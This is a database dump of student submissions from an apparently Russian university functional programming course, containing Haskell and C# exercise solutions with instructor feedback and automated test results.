(3724, 94, '3742311', '2012-11-18 19:39:30', 2, 'data Scheme = Scheme Scheme | (Scheme, Scheme) | Integer\r\n  --- ??? Это я не понял - у вас же даже тип неправильно описан. Те вы писали программу не попробовав сначала описать тип?\r\n\r\ncountDigist i = if i < 10 then 1 else 1 + countDigits (div i 10)\r\n\r\nconcatSeq [] [] = []\r\nconcatSeq (h1:t1) (h2:t2) = (h1++h2):(concatSeq t1 t2)\r\n\r\nnormalizeWidth s (h1, w1) w = if w1 < w then (let (addEmpty, addLine) = (map (x -> '' '') [1..(w - w1)], map (x -> ''-'') [1..(w - w1)]) in let (res, _) = foldr (x (t, n) -> (if (div h1 2) == n then ((addLine ++ x):t) else ((addEmpty ++ x):t), n + 1)) ([], 0) s in res) else s\r\n\r\nnormalizeHeight s (h1, w1) h = let ofs = (div (h - h1) 2) in let addedStrs = map (x -> map (y -> '' '') [1..w1]) [1..ofs] in addedStrs ++ s ++ addedStrs\r\n\r\nseq (s1, (h1, w1)) (s2, (h2, w2)) = let (h, w) = ((max h1 h2), w1 + w2 + 2) in concatSeq (normalizeHeight s1 (h1, w1) h) (normalizeHeight s2 (h2, w2) h)\r\n\r\npar (s1, (h1, w1)) (s2, (h2, w2)) = let (h, w) = (h1 + h2 + 1, (max w1 w2)) in (let (res, _) = (foldr (str (t, n) -> (if n == (div h 2) then (''-'':''-'':str)++"--" else if (n >= (div h2 2)) && (n <= h - (div h1 2)) t', '<br/>Тесты успешно пройдены!'),
(3725, 104, 'tonyo', '2012-11-18 19:48:40', 1, 'doubleEven xs = \r\n  xs >>= x -> if mod x 2 == 0 then [x,x] else [x] ', '<br/>Тесты успешно пройдены!'),
(3726, 96, '5772638', '2012-11-18 19:59:06', 1, '  --- Вообще тут хорошо бы описать Merge так, чтобы он работал и с бесконечными последовательностями\r\n  --- (и это не очень трудно). Но ОК, засчитано.\r\n﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace ConsoleApplication1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static IEnumerable<int> Merge(int[] a, int[] b) \r\n\r\n        {\r\n\r\n            int i=0,j=0;\r\n\r\n            while(i<a.Length&&j<b.Length)\r\n\r\n            {\r\n\r\n                if (a[i] < b[j]) { yield return a[i]; i++; }\r\n\r\n                else  {\r\n\r\n                    yield return b[j];\r\n\r\n                    j++;\r\n\r\n                    if (a[i] == b[j]) i++;\r\n\r\n                }\r\n\r\n                }\r\n\r\n            while (j < b.Length) {\r\n\r\n                yield return b[j];\r\n\r\n                j++;\r\n\r\n            }\r\n\r\n            while (i < a.Length)\r\n\r\n            {\r\n\r\n                yield return b[i];\r\n\r\n                i++;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8};\r\n\r\n            int[] b = { 3, 5,8, 9 };\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.WriteLine(i); // Должно напечататься 1, 3, 5, 8, 9\r\n\r\n            }\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3727, 102, 'tonyo', '2012-11-18 19:59:28', 1, 'findMajor xs = findMajor1 xs (sum xs)\r\n\r\nfindMajor1 [] _ = Nothing\r\nfindMajor1 (x:xs) s = if 2*x > s\r\n                      then Just x\r\n                      else findMajor1 xs s\r\n', '<br/>Тесты успешно пройдены!'),
(3728, 103, 'tonyo', '2012-11-18 20:09:21', 1, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x\r\n                       then x\r\n                       else find cond xs err\r\n\r\nfindInLists [] cond err = err\r\nfindInLists (x:xxs) cond err = find cond x $ findInLists xxs cond err', '<br/>Тесты успешно пройдены!'),
(3729, 93, '4837959', '2012-11-18 20:33:01', 1, 'import Data.List\r\n\r\n  --- ОК, но на самом деле, раз уж вы додумались использовать merge, то можно использовать\r\n  --- tying the knot для ham и получится гораздо короче. Мы это в четверг разберем.\r\n\r\nmerge [] ys = ys\r\n\r\nmerge xs [] = xs\r\n\r\nmerge (x:xs) (y:ys)\r\n\r\n    | x == y = merge xs (y:ys)\r\n\r\n    | x < y = x:merge xs (y:ys)\r\n\r\n    | otherwise = y:merge (x:xs) ys\r\n\r\n\r\n\r\nstep = 10\r\n\r\n\r\n\r\nham = ham'' 0\r\n\r\nham'' from = let\r\n\r\n                to = from + step - 1\r\n\r\n                new_from = from + step\r\n\r\n                xs = sort [3^i * 10^(sum - i) | sum <- [from..to], i <- [0..sum]]\r\n\r\n            in (head xs):merge (tail xs) (ham'' new_from)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3730, 95, '318210', '2012-11-19 05:08:51', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace allDifferent241\r\n{\r\n    class Program\r\n    {\r\n        public static bool allDifferent(int[] a)\r\n        {\r\n            return allDifferent1(a, 0, t => true);\r\n        }\r\n        public static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n        {\r\n            if (from + 1 > a.Length)\r\n            {\r\n                return true;\r\n            }\r\n            else if (!cond.Invoke( a[from] ))\r\n            {\r\n                return false;\r\n\r\n            }\r\n            else \r\n            {\r\n                Predicate<int> cond1 = (int t) => (cond.Invoke(t) && (t != a[from]));\r\n                return allDifferent1(a, from + 1, cond1);\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 5, 2, 2, 4, 5 };\r\n            Console.WriteLine(allDifferent(a));\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(3731, 98, '318210', '2012-11-19 06:18:07', 0, 'data Tree a = Empty | Node a (Tree a) (Tree a) deriving Show\r\n\r\ntoStr Empty = "e"\r\ntoStr (Node c l r) = c ++ toStr l ++ toStr r\r\n\r\nfromStr1 (x:xs) | x == ''e'' = (Empty, xs)\r\n	        | otherwise =   let\r\n		                (l, rem1) = fromStr1 xs\r\n		                (r, rem2) = fromStr1 rem1\r\n		                in (Node x l r, rem2)\r\n\r\nfromStr str = fst (fromStr1 str)', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3732, 98, '318210', '2012-11-19 06:21:36', 2, '--в winhugs у меня всё сработало, только если в\r\n--примере не `a`, а "a". Вообще у меня winhugs не\r\n--распознал символ `, видимо с кодировкой проблемы\r\n--(с юникодом не дружит, например)\r\n\r\nТак а где программа то, присылайте. Если проблема только в кавычках, то я зачту.\r\n\r\nНа самом деле в примере должна быть не обратная кавычка а прямая, просто если бы я ввел прямую кваычку,\r\nона бы неправильно отобразилась в системе тестирования.\r\n\r\n ', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3733, 97, '318210', '2012-11-19 07:03:06', 1, 'checkBrackets (x:xs) = ch1 xs [x]\r\n\r\nch1 [] sp | length sp > 0 = False\r\n	  | otherwise = True\r\n\r\nch1 (x:xs) [] = ch1 xs [x]\r\n\r\nch1 (x:xs) (y:ys) | x == '')'' && y /= ''('' = False\r\n		  | x == '']'' && y /= ''['' = False\r\n		  | x == ''('' || x == ''['' = ch1 xs (x:y:ys)\r\n		  | otherwise = ch1 xs ys', '<br/>Тесты успешно пройдены!'),
(3734, 98, '318210', '2012-11-19 07:03:52', 1, '  --- Просто как замечание, если бы вы написали \r\n  --- toStr (Node c l r) = [c] ++ toStr l ++ toStr r\r\n  --- то у вас бы тесты прошли\r\n\r\ndata Tree a = Empty | Node a (Tree a) (Tree a) deriving Show\r\n\r\ntoStr Empty = "e"\r\ntoStr (Node c l r) = c ++ toStr l ++ toStr r\r\n\r\nfromStr1 (x:xs) | x == ''e'' = (Empty, xs)\r\n	        | otherwise =   let\r\n		                (l, rem1) = fromStr1 xs\r\n		                (r, rem2) = fromStr1 rem1\r\n		                in (Node x l r, rem2)\r\n\r\nfromStr str = fst (fromStr1 str)', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3735, 108, '2562137', '2012-11-19 07:57:20', 1, 'queens n k = f n k 1 (v h -> True)\r\n\r\n\r\n\r\nf _ 0 _ _ = [[]]\r\n\r\nf n k i cond =\r\n\r\n	[(i, x):xs |\r\n\r\n		x <- filter (cond i) [1..n], \r\n\r\n		xs <- f n (k-1) (i+1) (v h -> cond v h && h /= x && v+h /= i+x && v-h /= i-x)\r\n\r\n	]\r\n\r\n\r\n\r\ntest = (\r\n\r\n    queens 3 2\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3736, 107, '2562137', '2012-11-19 07:57:50', 1, 'data LogExpr = T | F | X | Or LogExpr LogExpr | And LogExpr LogExpr | Not LogExpr\r\n\r\n\r\n\r\neval T v = True\r\n\r\neval F v = False\r\n\r\neval X v = v\r\n\r\neval (Or e1 e2) v = (eval e1 v) || (eval e2 v)\r\n\r\neval (And e1 e2) v = (eval e1 v) && (eval e2 v)\r\n\r\neval (Not e) v = not (eval e v)\r\n\r\n\r\n\r\ninstance Eq LogExpr where\r\n\r\n	(==) a b = (eval a False == eval b False) && (eval a True == eval b True)\r\n\r\n	\r\n\r\n	-- also possible:\r\n\r\n	-- equiv = eval (Or (And a b) (And (Not a) (Not b))) -- a && b || !a && !b\r\n\r\n	-- (==) a b = equiv True && equiv False\r\n\r\n\r\n\r\ntest = (\r\n\r\n	Or X (Not X) == T,\r\n\r\n	Or X (And X (Not X)) == T\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3737, 106, '2562137', '2012-11-19 08:39:05', 1, 'findMajor list = g list (f list 0 0) 0 0\r\n\r\n\r\n\r\nf [] count ans = ans\r\n\r\nf (x:xs) count ans =\r\n\r\n	if count == 0 then f xs 1 x\r\n\r\n	else if (x == ans) then f xs (count + 1) ans\r\n\r\n	else f xs (count - 1) ans\r\n\r\n\r\n\r\ng [] y k n = if 2*k > n then Just y else Nothing\r\n\r\ng (x:xs) y k n =\r\n\r\n	if x == y\r\n\r\n	then g xs y (k + 1) (n + 1)\r\n\r\n	else g xs y k (n + 1)\r\n\r\n\r\n\r\ntest = (\r\n\r\n    findMajor [1,2,3,2,2,2,1],\r\n\r\n	findMajor [1,2,3,2,2,1]\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3738, 99, '318210', '2012-11-19 10:41:23', 1, '  --- Ну, честно, говоря, я в жтом задании имел в виду не овсем то - я имел в виду создать \r\n  --- специлизировнные классы для хранения выражений, и сними работать. Мне кажется этоболее правильно.\r\n  --- Но ОК, засчитано, и мы это обсудим.\r\n﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _261\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public class Node \r\n\r\n        {\r\n\r\n            private String value;\r\n\r\n\r\n\r\n            public String getValue()\r\n\r\n            {\r\n\r\n                return this.value;\r\n\r\n            }\r\n\r\n            public void setValue(String val)\r\n\r\n            {\r\n\r\n                this.value = val;\r\n\r\n            }\r\n\r\n\r\n\r\n            public Node(String _value)\r\n\r\n            {\r\n\r\n                value = _value;\r\n\r\n            }\r\n\r\n        }\r\n\r\n        public class Tree\r\n\r\n        {\r\n\r\n            private Node root;\r\n\r\n            private Tree left;\r\n\r\n            private Tree right;\r\n\r\n\r\n\r\n            public Tree getLeft()\r\n\r\n            {\r\n\r\n                return this.left;\r\n\r\n            }\r\n\r\n            public Tree getRight()\r\n\r\n            {\r\n\r\n                return this.right;\r\n\r\n            }\r\n\r\n            public Node getRoot()\r\n\r\n            {\r\n\r\n                return this.root;\r\n\r\n            }\r\n\r\n            public void setLeft(Tree left)\r\n\r\n            {\r\n\r\n                this.left = left;\r\n\r\n            }\r\n\r\n            public void setRight(Tree right)\r\n\r\n            {\r\n\r\n                this.right = right;\r\n\r\n            }\r\n\r\n            public Tree(Node _root)\r\n\r\n            {\r\n\r\n                root = _root;\r\n\r\n                left = null;\r\n\r\n                right = null;\r\n\r\n            }\r\n\r\n            public Tree(Node _root, Tree _left, Tree _right)\r\n\r\n            {\r\n\r\n                root = _root;\r\n\r\n                left = _left;\r\n\r\n                right = _right;\r\n\r\n            }\r\n\r\n            public String trav()\r\n\r\n            {\r\n\r\n                String res = root.getValue();\r\n\r\n                if (this.left == null && this.right == null)\r\n\r\n                {\r\n\r\n                    return res;\r\n\r\n                }\r\n\r\n                if (this.left != null)\r\n\r\n                {\r\n\r\n                    if (this.left.getRoot().getValue()[0].Equals(''X''))\r\n\r\n                    {\r\n\r\n                        res = res + " " + this.left.trav();\r\n\r\n                    }\r\n\r\n                    else \r\n\r\n                    {\r\n\r\n                        res = res + " (" + this.left.trav() + ")";\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                if (this.right != null)\r\n\r\n                {\r\n\r\n                    if (this.right.getRoot().getValue()[0].Equals(''X''))\r\n\r\n                    {\r\n\r\n                        res = res + " " + this.right.trav();\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                    {\r\n\r\n                        res = res + " (" + this.right.trav() + ")";\r\n\r\n                    }                    \r\n\r\n                }\r\n\r\n\r\n\r\n                if (res.Length == 1)\r\n\r\n                    return res;\r\n\r\n                else \r\n\r\n                {\r\n\r\n                    return "(" + res + ")";\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static Tuple<String, String, String> parseStr(String expr)\r\n\r\n        {\r\n\r\n            if (expr[0].Equals(''X''))\r\n\r\n            {\r\n\r\n                Tuple<String, String, String> t = new Tuple<String, String, String>("X", null, null);\r\n\r\n                return t;\r\n\r\n            }\r\n\r\n            else if (expr[0].Equals(''N''))\r\n\r\n            {\r\n\r\n                Tuple<String, String, String> t = new Tuple<String, String, String>(expr, null, null);\r\n\r\n                return t;\r\n\r\n            }\r\n\r\n            else \r\n\r\n            {\r\n\r\n                int ind = expr.IndexOf(" ");\r\n\r\n                String s = expr.Substring(0, ind);\r\n\r\n                String rem = expr.Substring(ind + 1);\r\n\r\n                \r\n\r\n                String l;\r\n\r\n                String r;\r\n\r\n\r\n\r\n                if (rem[0].Equals(''X''))\r\n\r\n                {\r\n\r\n                    l = "X";\r\n\r\n                    if (rem[2].Equals(''X''))\r\n\r\n                    {\r\n\r\n                        r = rem.Substring(2);\r\n\r\n                    }\r\n\r\n                    else // окрывающая скобка\r\n\r\n                    {\r\n\r\n                        r = rem.Substring(3, rem.Length - 4);\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                else // открывающая скобка\r\n\r\n                {\r\n\r\n                    int cnt = 1;\r\n\r\n                    int num1 = 0;\r\n\r\n                    while (cnt > 0) \r\n\r\n                    {\r\n\r\n                        num1++;\r\n\r\n                        if ( rem[num1].Equals(''('') ) cnt++;\r\n\r\n                        if ( rem[num1].Equals('')'') ) cnt--;\r\n\r\n                    }\r\n\r\n                    l = rem.Substring(1, num1 - 1);\r\n\r\n                    if (rem[num1 + 2].Equals(''X''))\r\n\r\n                    {\r\n\r\n                        r = "X";\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                    {\r\n\r\n                        r = rem.Substring(num1 + 3, rem.Length - num1 - 4);\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                Tuple<String, String, String> t = new Tuple<String, String, String>(s, l, r);\r\n\r\n                return t;\r\n\r\n            }\r\n\r\n        }\r\n\r\n        public static Tree parse(String expr)\r\n\r\n        {\r\n\r\n            Tree tree;\r\n\r\n            \r\n\r\n            Tuple<String, String, String> t = parseStr(expr);\r\n\r\n            Node root = new Node(t.Item1);\r\n\r\n\r\n\r\n            if (t.Item2 == null)\r\n\r\n            {\r\n\r\n                tree = new Tree(root);\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                Tree l = parse(t.Item2);\r\n\r\n                Tree r = parse(t.Item3);\r\n\r\n                tree = new Tree(root, l, r);\r\n\r\n            }\r\n\r\n            return tree;\r\n\r\n        }\r\n\r\n        // осталось правильно обойти дерево\r\n\r\n        public static String diff1(Tree tree)\r\n\r\n        {\r\n\r\n            //Tree tree = parse(str);\r\n\r\n            String result = "";\r\n\r\n\r\n\r\n            if (tree.getLeft() == null && tree.getRight() == null)\r\n\r\n            {\r\n\r\n                String s = tree.getRoot().getValue();\r\n\r\n                if (s[0].Equals(''X''))\r\n\r\n                {\r\n\r\n                    return result + "(N 1)";\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    return result + "(N 0)";\r\n\r\n                }\r\n\r\n            }\r\n\r\n            if (tree.getLeft() != null)\r\n\r\n            {\r\n\r\n                String s = tree.getRoot().getValue();\r\n\r\n                if (s[0].Equals(''M''))\r\n\r\n                {\r\n\r\n                    result = result + "Add (Mult " + diff1(tree.getLeft()) + " " + tree.getRight().trav() + ") "\r\n\r\n                        + "(Mult " + tree.getLeft().trav() + " " +diff1(tree.getRight()) + ")" ;\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    result = result + "(Add " + diff1(tree.getLeft()) + " " + diff1(tree.getRight()) + ")";\r\n\r\n                }\r\n\r\n            }\r\n\r\n            return result;\r\n\r\n        }\r\n\r\n        \r\n\r\n        public static String diff(String str)\r\n\r\n        {\r\n\r\n            Tree tree = parse(str);\r\n\r\n            return diff1(tree);\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            String exp1 = "Mult (Add X (N 2)) X";\r\n\r\n            String exp2 = "Mult X X";\r\n\r\n            String exp3 = "Add X X";\r\n\r\n\r\n\r\n            Console.WriteLine(diff(exp1));\r\n\r\n            Console.WriteLine(diff(exp2));\r\n\r\n            Console.WriteLine(diff(exp3));\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3739, 95, '397095', '2012-11-19 12:46:47', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class Differences\r\n	{\r\n		static bool allDifferent(int[] data)\r\n		{\r\n			return checkDifferent(data, 0, t => true);\r\n		}\r\n\r\n		static bool checkDifferent(int[] data, int from, Predicate<int> cond)\r\n		{\r\n			return data.Length == from || cond.Invoke(data[from]) && checkDifferent(data, from + 1, t => cond.Invoke(t) && t != data[from]);\r\n		}\r\n\r\n		static void Main(string[] args) \r\n		{\r\n			Console.WriteLine("{0}", allDifferent(new int[] {1,2,3,4,5,5,6,7,8}));\r\n			Console.WriteLine("{0}", allDifferent(new int[] {1,2,3,4,5,6,7,8}));\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3740, 96, '397095', '2012-11-19 12:58:02', 2, '   --- Это не совсем по условию. Параметры должны быть не массивами, а IEnumerable, те любыми последовательностями\r\n   --- При этом, негде ведь не написано, что последовательности конечные. Те желательно, чтобы Merge\r\n   --- работал и с бесконечными последовательностями.\r\n   --- Исправьте, пожалуйста, если хотите, до среды включительно\r\nusing System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class Differences\r\n	{\r\n		static IEnumerable<int> Merge(int[] a, int[] b)\r\n		{\r\n			int index_a = 0;\r\n			int index_b = 0;\r\n			while (index_a < a.Length || index_b < b.Length)\r\n			{\r\n				int curr_a = index_a < a.Length ? a[index_a] : Int32.MaxValue;\r\n				int curr_b = index_b < b.Length ? b[index_b] : Int32.MaxValue;\r\n				if (curr_a < curr_b)\r\n				{\r\n					index_a++;\r\n					yield return curr_a;\r\n				}\r\n				else if (curr_b < curr_a)\r\n				{\r\n					index_b++;\r\n					yield return curr_b;\r\n				}\r\n				else\r\n				{\r\n					index_a++;\r\n					index_b++;\r\n					yield return curr_a;\r\n				}\r\n			}\r\n		}\r\n\r\n		static void Main(string[] args) \r\n		{\r\n			int [] a = { 1, 5, 8 };\r\n			int [] b = { 3, 5, 9 };\r\n			foreach (int i in Merge(a, b))\r\n			{\r\n				Console.WriteLine(i);\r\n			}\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3741, 104, '318210', '2012-11-19 13:15:55', 1, '--doub xs = concatMap (x -> if (x `mod` 2 == 0) then x:x:[] else [x] ) xs\r\n\r\ndoubleEven  xs = concat (xs >>= (	 -> return (t `mod` 2 == 0) >>= \r\n		   (\r\n -> case r of True -> return (t:t:[])\r\n				    _    -> return [t] )))\r\n\r\n--f2 xs = concatMap (x -> if (x `mod` 2 == 0) then x:x:[] else [x]) xs\r\ndoubleEven1  xs = xs >>= (x -> if (x `mod` 2 == 0) then x:x:[] else [x])\r\n\r\n\r\n--А что нужно было в итоге написать? И какой вариант лучше?\r\n  --- Лучше doubleEven1 мне кажется . Но можно немного короче записать\r\n  ---  doubleEven1  xs = xs >>= x -> if x `mod` 2 == 0 then [x,x] else [x]', '<br/>Тесты успешно пройдены!'),
(3742, 99, 'code', '2012-11-19 13:16:28', 1, '  --- Честно говоря это не совсем то, что я имел в виду, мне кажется разумнее отвести в памяти специальную\r\n  --- структуру, что-то вроде дерева, и уже для него реализовывать дифференцирование\r\n  --- Но ОК, засчитано. \r\npublic static string diff(string str)\r\n{\r\nstring result = "";\r\nstring temp = "";\r\nstring[] param=new string[2];\r\nint i = 0;\r\nif (str[0] == ''X'')\r\n{\r\nreturn "N 1";\r\n}\r\nif (str[0] == ''N'')\r\n{\r\nreturn "N 0";\r\n}\r\nwhile (str[i] != '' '')\r\n{\r\ni++;\r\n}\r\ni++;\r\nfor (int k = 0; k < 2; k++)\r\n{\r\nif (str[i] == ''('')\r\n{\r\nwhile (str[i] != '')'')\r\n{\r\ni++;\r\nparam[k] += str[i];\r\n}\r\n}\r\nelse\r\n{\r\nparam[k] += str[i];\r\n}\r\ni += 2;\r\n}\r\nif (str[0] == ''M'')\r\n{\r\nresult += "Add(";\r\nresult += "( Mult " + "(" + diff(param[0])+") "+param[1] + ") ( Mult " + param[0]+ " (" +diff(param[1])+")"+ ")";\r\nresult += ")";\r\n}\r\nif (str[0] == ''A'')\r\n{\r\nresult += "Add " + "(" + diff(param[0]) + ") (" + diff(param[1]) + ")";\r\n}\r\nif (str[0] == ''S'')\r\n{\r\nresult += "Sub " + "(" + diff(param[0]) + ") (" + diff(param[1]) + ")";\r\n}\r\nif (str[0] == ''D'')\r\n{\r\nresult += "Div (" +\r\n"Sub (Mult ( " + diff(param[0]) + ") " + param[1] + ") " +\r\n"(Mult " + param[0] + " (" + diff(param[1]) + ")) " +\r\n") "+\r\n"(Mult " + param[1] + " " + param[1] + ")";\r\n\r\n}\r\nreturn result;\r\n\r\n}', '<br/>Тесты успешно пройдены!'),
(3743, 105, '318210', '2012-11-19 13:16:31', 1, '   --- OK, но можно короче, это мы обсудим\r\ncartesian xs ys = xs >>= (x -> ys >>= (y -> return (x/=y) >>=\r\n             (\r\n -> case r of True -> return (x,y)\r\n                              _    -> fail "")))', '<br/>Тесты успешно пройдены!'),
(3744, 97, '397095', '2012-11-19 13:18:56', 1, 'checkBrackets xs = stack xs []\r\n\r\nstack [] [] = True\r\nstack [] _ = False\r\nstack (x:xs) [] = stack xs [x]\r\nstack (x:xs) (s:ss) = if x == '']'' && s == ''['' || x == '')'' && s == ''('' then stack xs ss else stack xs (x:s:ss)', '<br/>Тесты успешно пройдены!'),
(3745, 96, '383483', '2012-11-19 14:36:37', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _24_2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        private static IEnumerable<int> Merge(IEnumerable<int> enum1, IEnumerable<int> enum2)\r\n\r\n        {\r\n\r\n            IEnumerator<int> e1 = enum1.GetEnumerator();\r\n\r\n            IEnumerator<int> e2 = enum2.GetEnumerator();\r\n\r\n\r\n\r\n            bool remaining1 = e1.MoveNext();\r\n\r\n            bool remaining2 = e2.MoveNext();\r\n\r\n\r\n\r\n            while (remaining1 || remaining2)\r\n\r\n            {\r\n\r\n                if (remaining1 && remaining2)\r\n\r\n                {\r\n\r\n                    if (e1.Current > e2.Current)\r\n\r\n                    {\r\n\r\n                        yield return e2.Current;\r\n\r\n                        remaining2 = e2.MoveNext();\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                    if (e1.Current < e2.Current)\r\n\r\n                    {\r\n\r\n                        yield return e1.Current;\r\n\r\n                        remaining1 = e1.MoveNext();\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                    if (e1.Current == e1.Current)\r\n\r\n                    {\r\n\r\n                        yield return e1.Current;\r\n\r\n                        remaining1 = e1.MoveNext();\r\n\r\n                        remaining2 = e2.MoveNext();\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                else if (remaining2)\r\n\r\n                {\r\n\r\n                    yield return e2.Current;\r\n\r\n                    remaining2 = e2.MoveNext();\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    yield return e1.Current;\r\n\r\n                    remaining1 = e1.MoveNext();\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8 };\r\n\r\n            int[] b = { 3, 5, 9 };\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.WriteLine(i);\r\n\r\n            }\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3746, 96, '4169333', '2012-11-19 15:02:37', 1, 'namespace _2_19_11\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<int> Merge (IEnumerable<int> a, IEnumerable<int> b)\r\n        {\r\n            IEnumerator<int> a1 = a.GetEnumerator();\r\n            IEnumerator<int> b1 = b.GetEnumerator();\r\n            a1.MoveNext();\r\n            b1.MoveNext();\r\n            \r\n            while (true)\r\n            {\r\n\r\n                if (a1.Current < b1.Current)\r\n                {\r\n                    yield return a1.Current;\r\n                    if (!(a1.MoveNext()))\r\n                    {\r\n                        yield return b1.Current;\r\n                        while (b1.MoveNext())\r\n                        {\r\n                            yield return b1.Current;\r\n                        }\r\n                        yield break;\r\n                    }\r\n\r\n                }\r\n                else if (a1.Current > b1.Current)\r\n                {\r\n                    yield return b1.Current;\r\n                    if (!(b1.MoveNext()))\r\n                    {\r\n                        yield return a1.Current;\r\n                        while (a1.MoveNext())\r\n                        {\r\n                            yield return a1.Current;\r\n                        }\r\n                        yield break;\r\n                    }\r\n                }\r\n                else\r\n                {\r\n                    yield return a1.Current;\r\n                    if (!(b1.MoveNext()))\r\n                    {\r\n                        \r\n                        while (a1.MoveNext())\r\n                        {\r\n                            yield return a1.Current;\r\n                        }\r\n                        yield break;\r\n                    }\r\n                    if (!(a1.MoveNext()))\r\n                    {\r\n                        yield return b1.Current;\r\n                        while (b1.MoveNext())\r\n                        {\r\n                            yield return b1.Current;\r\n                        }\r\n                        yield break;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 1, 5, 8, 10};\r\n            int[] b = { 3, 5, 7, 10, 11};\r\n            foreach (int i in Merge(a, b))\r\n            {\r\n                Console.WriteLine(i); \r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(3747, 95, '4169333', '2012-11-19 15:03:25', 1, 'namespace _1_19_11\r\n{\r\n    class Program\r\n    {\r\n        public static bool allDifferent(int[] a)\r\n        {\r\n            return allDifferent1(a, 0, t => true);\r\n        }\r\n        public static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n        {\r\n            if (cond (a[from]) == false)\r\n            {\r\n              return false;\r\n            }\r\n            else \r\n            {\r\n                //если дошли до последнего элемента,значит повторов нет\r\n                if (from == a.Length-1)\r\n                {\r\n                    return true;\r\n                }\r\n                else\r\n                {\r\n                    return allDifferent1(a, from + 1, x => (cond(x)) && (x != a[from]));\r\n                }\r\n            }\r\n\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = {1,2,3,4,5};\r\n            Console.WriteLine(allDifferent(a));\r\n            Console.ReadLine();\r\n\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3748, 95, '383483', '2012-11-19 16:09:10', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\nusing System.Linq.Expressions;\r\n\r\n\r\n\r\nnamespace _24_1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        private static bool allDifferentSub(int[] a, int from, Predicate<int> cond)\r\n\r\n        {\r\n\r\n            if (from == a.Length)\r\n\r\n                return true;\r\n\r\n            else\r\n\r\n            {\r\n\r\n                if (!cond.Invoke(a[from]))\r\n\r\n                    return false;\r\n\r\n                else \r\n\r\n                {\r\n\r\n                    return allDifferentSub(a,from+1,(t=>cond.Invoke(t)&&t!=a[from]));\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n        private static bool allDifferent(int[] a)\r\n\r\n        {\r\n\r\n            return allDifferentSub(a, 0, t => true);\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = 